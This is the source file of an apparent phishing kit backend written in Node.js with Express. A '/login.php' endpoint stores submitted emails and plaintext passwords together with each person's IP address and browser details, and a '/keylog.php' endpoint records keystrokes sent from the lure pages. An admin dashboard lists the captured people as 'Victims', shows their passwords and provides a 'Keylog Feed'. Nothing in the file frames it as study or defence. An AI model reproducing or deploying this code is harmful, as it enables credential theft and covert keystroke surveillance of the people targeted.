const express = require('express');
const path = require('path');
const fs = require('fs');
const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-in-production';

// ── Database ──
const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
const db = new Database(path.join(DATA_DIR, 'database.sqlite'));
db.pragma('journal_mode = WAL');

db.exec(`
  CREATE TABLE IF NOT EXISTS credentials (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL DEFAULT '',
    email TEXT NOT NULL,
    password TEXT NOT NULL DEFAULT '',
    ip TEXT NOT NULL DEFAULT '',
    user_agent TEXT,
    country TEXT DEFAULT '',
    city TEXT DEFAULT '',
    latitude REAL DEFAULT NULL,
    longitude REAL DEFAULT NULL,
    created_at TEXT DEFAULT (datetime('now'))
  );
  CREATE TABLE IF NOT EXISTS keylogs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email_identifier TEXT DEFAULT '',
    key_data TEXT,
    field_context TEXT DEFAULT '',
    full_log TEXT,
    created_at TEXT DEFAULT (datetime('now'))
  );
  CREATE TABLE IF NOT EXISTS admin_users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now'))
  );
`);

const adminCount = db.prepare('SELECT COUNT(*) as c FROM admin_users').get();
if (adminCount.c === 0) {
  db.prepare('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)').run('admin', bcrypt.hashSync('admin123', 10));
}

// ── Middleware ──
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(require('cookie-parser')());

// ── Static files ──
app.use(express.static(__dirname));

// ── Auth helpers ──
function createToken(username) {
  return jwt.sign({ username }, JWT_SECRET, { expiresIn: '24h' });
}

function verifyToken(token) {
  try { return jwt.verify(token, JWT_SECRET); } catch { return null; }
}

function requireAdmin(req, res, next) {
  const token = req.cookies?.admin_token;
  const user = token ? verifyToken(token) : null;
  if (!user) return res.redirect('/admin_login.php');
  req.adminUser = user;
  next();
}

// ── API: Login capture ──
app.post('/login.php', (req, res) => {
  const action = req.body.action;

  if (action === 'preflight') {
    const email = (req.body.email || '').trim();
    if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
      return res.status(400).json({ error: 'Invalid email' });
    }
    return res.json({ status: 'ok', email });
  }

  if (action === 'capture') {
    const email = (req.body.email || '').trim();
    const password = req.body.password || '';
    if (!email || !password) return res.status(400).json({ error: 'Missing fields' });

    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || '0.0.0.0';
    const name = (email.split('@')[0] || '').replace(/[._]/g, ' ').replace(/\d+/g, '').trim() || 'User';
    const ua = req.headers['user-agent'] || '';

    db.prepare(`INSERT INTO credentials (name, email, password, ip, user_agent) VALUES (?, ?, ?, ?, ?)`)
      .run(name.charAt(0).toUpperCase() + name.slice(1), email, password, ip, ua);

    return res.json({ status: 'ok' });
  }

  res.status(400).json({ error: 'Invalid action' });
});

// ── API: Keylog ──
app.post('/keylog.php', (req, res) => {
  const action = req.body.action;
  if (action !== 'log_keys') return res.status(400).json({ error: 'Invalid action' });

  const keysRaw = req.body.keys;
  if (!keysRaw) return res.json({ status: 'empty' });

  try {
    const keysData = JSON.parse(keysRaw);
    const emailId = req.body.email_id || '';
    const pageView = req.body.page_view || '';
    const fullLog = JSON.stringify({ keys: keysData, page: pageView, time: new Date().toISOString() });

    db.prepare('INSERT INTO keylogs (email_identifier, key_data, field_context, full_log) VALUES (?, ?, ?, ?)')
      .run(emailId, JSON.stringify(keysData), pageView, fullLog);

    res.json({ status: 'ok' });
  } catch {
    res.status(400).json({ status: 'invalid' });
  }
});

// ── Admin login ──
app.post('/admin_login.php', (req, res) => {
  const username = (req.body.username || '').trim();
  const password = req.body.password || '';

  const user = db.prepare('SELECT * FROM admin_users WHERE username = ?').get(username);
  if (user && bcrypt.compareSync(password, user.password_hash)) {
    const token = createToken(username);
    res.cookie('admin_token', token, { httpOnly: true, maxAge: 86400000, sameSite: 'lax', path: '/' });
    return res.redirect('/admin.php');
  }

  res.send(`
    <html><body style="background:#111;color:#e8eaed;font-family:Inter,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;">
    <form method="post" style="background:#1a1a1a;padding:40px;border-radius:16px;width:360px;">
      <h2 style="margin-bottom:24px;">Admin Login</h2>
      <p style="color:#f28b82;margin-bottom:16px;">Invalid credentials</p>
      <input name="username" placeholder="Username" style="width:100%;height:44px;border-radius:8px;border:1px solid #333;background:#222;color:#e8eaed;padding:0 12px;margin-bottom:12px;" required autofocus>
      <input type="password" name="password" placeholder="Password" style="width:100%;height:44px;border-radius:8px;border:1px solid #333;background:#222;color:#e8eaed;padding:0 12px;margin-bottom:20px;" required>
      <button type="submit" style="width:100%;height:44px;border-radius:8px;border:none;background:#1a73e8;color:#fff;font-size:15px;cursor:pointer;">Sign In</button>
    </form></body></html>
  `);
});

// ── Admin dashboard ──
app.get('/admin.php', requireAdmin, (req, res) => {
  const totalVictims = db.prepare('SELECT COUNT(*) as c FROM credentials').get().c;
  const todayCount = db.prepare("SELECT COUNT(*) as c FROM credentials WHERE date(created_at) = date('now')").get().c;
  const uniqueIps = db.prepare('SELECT COUNT(DISTINCT ip) as c FROM credentials').get().c;
  const totalKeys = db.prepare('SELECT COUNT(*) as c FROM keylogs').get().c;
  const lastRow = db.prepare('SELECT MAX(created_at) as t FROM credentials').get();
  const lastCapture = lastRow?.t ? lastRow.t : 'No captures yet';

  const search = req.query.search || '';
  const page = Math.max(1, parseInt(req.query.page) || 1);
  const perPage = 25;
  const offset = (page - 1) * perPage;

  let creds, totalResults;
  if (search) {
    const like = `%${search}%`;
    creds = db.prepare('SELECT * FROM credentials WHERE name LIKE ? OR email LIKE ? OR ip LIKE ? OR country LIKE ? ORDER BY created_at DESC LIMIT ? OFFSET ?').all(like, like, like, like, perPage, offset);
    totalResults = db.prepare('SELECT COUNT(*) as c FROM credentials WHERE name LIKE ? OR email LIKE ? OR ip LIKE ? OR country LIKE ?').get(like, like, like, like).c;
  } else {
    creds = db.prepare('SELECT * FROM credentials ORDER BY created_at DESC LIMIT ? OFFSET ?').all(perPage, offset);
    totalResults = db.prepare('SELECT COUNT(*) as c FROM credentials').get().c;
  }

  const totalPages = Math.max(1, Math.ceil(totalResults / perPage));

  if (req.query.delete === 'all') {
    db.prepare('DELETE FROM credentials').run();
    return res.redirect('/admin.php');
  }

  if (req.query.delete) {
    db.prepare('DELETE FROM credentials WHERE id = ?').run(parseInt(req.query.delete));
    return res.redirect('/admin.php');
  }

  const locations = db.prepare('SELECT country, city, latitude, longitude FROM credentials WHERE latitude IS NOT NULL AND longitude IS NOT NULL GROUP BY country, city').all();

  function esc(s) { return String(s || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

  const keylogs = db.prepare('SELECT * FROM keylogs ORDER BY id DESC LIMIT 50').all();

  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Admin Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Inter,sans-serif;background:#111;color:#e8eaed;display:flex;min-height:100vh}
.sidebar{width:220px;background:#161616;border-right:1px solid #222;padding:20px 12px;display:flex;flex-direction:column;flex-shrink:0}
.sidebar h3{font-size:18px;font-weight:500;margin-bottom:24px;color:#e8eaed;display:flex;align-items:center;gap:10px}
.sidebar nav{flex:1}
.sidebar nav a{display:block;padding:10px 12px;border-radius:8px;color:#9aa0a6;text-decoration:none;font-size:14px;margin-bottom:2px}
.sidebar nav a:hover,.sidebar nav a.active{background:#1a73e8;color:#fff}
.sidebar .logout{color:#9aa0a6;text-decoration:none;font-size:13px;padding-top:16px;border-top:1px solid #222}
.main{flex:1;padding:24px;overflow:auto}
.stats{display:grid;grid-template-columns:repeat(auto-fill,minmax(170px,1fr));gap:16px;margin-bottom:24px}
.stat-card{background:#1a1a1a;border-radius:12px;padding:24px;text-align:center}
.stat-card .num{font-size:32px;font-weight:600}
.stat-card .lbl{font-size:13px;color:#9aa0a6;margin-top:4px}
.toolbar{display:flex;gap:8px;margin-bottom:16px;align-items:center;flex-wrap:wrap}
.toolbar input{flex:1;min-width:200px;height:40px;border-radius:8px;border:1px solid #333;background:#1a1a1a;color:#e8eaed;padding:0 12px;font-size:13px;outline:none}
.toolbar button,.toolbar a{height:40px;padding:0 16px;border-radius:8px;border:none;font-size:13px;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;color:#fff}
.btn-primary{background:#1a73e8}
.btn-danger{background:#c5221f}
.btn-ghost{background:transparent;border:1px solid #333!important;color:#9aa0a6}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:700px}
th{text-align:left;padding:10px 12px;color:#9aa0a6;font-weight:500;border-bottom:1px solid #222;background:#1a1a1a}
td{padding:10px 12px;border-bottom:1px solid #1a1a1a}
code{background:#222;padding:2px 6px;border-radius:4px;font-size:12px}
.empty{text-align:center;padding:32px;color:#9aa0a6}
.pages{display:flex;justify-content:center;gap:6px;margin-top:16px}
.pages a{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:8px;text-decoration:none;font-size:13px;background:#1a1a1a;color:#e8eaed}
.pages a.active{background:#1a73e8}
.feed{display:flex;flex-direction:column;gap:6px}
.feed-entry{background:#1a1a1a;border-radius:10px;padding:12px}
.feed-entry .meta{font-size:12px;color:#9aa0a6;margin-bottom:6px;display:flex;gap:12px}
.feed-entry .data{font-size:13px;display:flex;gap:8px;flex-wrap:wrap}
@media(max-width:768px){.sidebar{display:none}.main{padding:16px}table{font-size:12px}}
</style></head><body>
<div class="sidebar">
  <h3><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#1a73e8" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg> Admin</h3>
  <nav>
    <a href="#" class="active" onclick="showTab('dashboard');return false">Dashboard</a>
    <a href="#" onclick="showTab('victims');return false">Victims</a>
    <a href="#" onclick="showTab('keylog');return false">Keylog Feed</a>
  </nav>
  <a href="/admin_logout.php" class="logout">Logout</a>
</div>
<div class="main">
  <div id="tab-dashboard">
    <div class="stats">
      <div class="stat-card"><div class="num">${totalVictims}</div><div class="lbl">Total Victims</div></div>
      <div class="stat-card"><div class="num">${todayCount}</div><div class="lbl">Today</div></div>
      <div class="stat-card"><div class="num">${uniqueIps}</div><div class="lbl">Unique IPs</div></div>
      <div class="stat-card"><div class="num">${totalKeys}</div><div class="lbl">Keystrokes</div></div>
      <div class="stat-card"><div class="num" style="font-size:18px">${esc(lastCapture)}</div><div class="lbl">Last Capture</div></div>
    </div>
  </div>
  <div id="tab-victims" style="display:none">
    <div class="toolbar">
      <form method="get" style="display:flex;gap:8px;flex:1">
        <input name="search" placeholder="Search by name, email, IP..." value="${esc(search)}">
        <button class="btn-primary">Search</button>
        ${search ? '<a href="/admin.php" class="btn-ghost">Clear</a>' : ''}
      </form>
      <a href="/admin.php?delete=all" class="btn-danger" onclick="return confirm('Delete ALL?')">Clear All</a>
    </div>
    <table>
      <thead><tr><th>ID</th><th>Name</th><th>Email</th><th>Password</th><th>IP</th><th>Date</th><th></th></tr></thead>
      <tbody>
        ${creds.length === 0 ? '<tr><td colspan="7" class="empty">No victims captured yet.</td></tr>' : creds.map(c => `
        <tr>
          <td>${c.id}</td>
          <td>${esc(c.name)}</td>
          <td>${esc(c.email)}</td>
          <td><code>${esc(c.password)}</code></td>
          <td>${esc(c.ip)}</td>
          <td style="color:#9aa0a6">${c.created_at}</td>
          <td><a href="/admin.php?delete=${c.id}" class="btn-danger" style="padding:4px 10px;font-size:11px;height:auto" onclick="return confirm('Delete?')">Delete</a></td>
        </tr>`).join('')}
      </tbody>
    </table>
    ${totalPages > 1 ? `<div class="pages">${Array.from({length: totalPages}, (_, i) => `<a href="/admin.php?page=${i+1}${search ? '&search='+encodeURIComponent(search) : ''}" class="${i+1===page?'active':''}">${i+1}</a>`).join('')}</div>` : ''}
  </div>
  <div id="tab-keylog" style="display:none">
    <div class="feed">
      ${keylogs.length === 0 ? '<div style="text-align:center;color:#9aa0a6;padding:32px">Waiting for keystrokes...</div>' : keylogs.map(k => {
        let keys;
        try { keys = JSON.parse(k.key_data); } catch { keys = {}; }
        return `<div class="feed-entry">
          <div class="meta"><span>${esc(k.email_identifier || 'anonymous')}</span><span>${esc(k.field_context)}</span><span>${k.created_at}</span></div>
          <div class="data">${Object.entries(keys).map(([ctx, val]) => `<span><span style="color:#9aa0a6">${esc(ctx)}:</span> ${esc(val)}</span>`).join('')}</div>
        </div>`;
      }).join('')}
    </div>
  </div>
</div>
<script>
function showTab(t){document.querySelectorAll('.main>div').forEach(d=>d.style.display='none');document.getElementById('tab-'+t).style.display='';document.querySelectorAll('.sidebar nav a').forEach(a=>a.classList.remove('active'));document.querySelector(\`.sidebar nav a[onclick*="\${t}"]\`).classList.add('active');}
const url = new URL(location.href);
if(url.searchParams.has('search')||url.searchParams.has('page'))showTab('victims');
</script>
</body></html>`);
});

// ── Admin logout ──
app.get('/admin_logout.php', (req, res) => {
  res.clearCookie('admin_token');
  res.redirect('/admin_login.php');
});

// ── Serve index.html for root ──
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ── Start ──
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
